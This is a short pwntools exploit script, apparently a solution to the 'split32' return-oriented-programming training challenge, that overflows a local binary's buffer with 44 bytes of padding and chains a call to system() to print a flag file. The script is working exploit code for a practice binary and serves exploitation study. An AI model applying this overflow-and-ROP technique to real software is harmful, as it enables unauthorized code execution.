from pwn import *

elf = context.binary = ELF("./split32")

rop = ROP(elf)
rop.system(next(elf.search("/bin/cat flag.txt")))

r = process(elf.path)

payload = ""
payload += "A" * 44
payload += str(rop)
r.sendlineafter("> ", payload)

r.interactive()
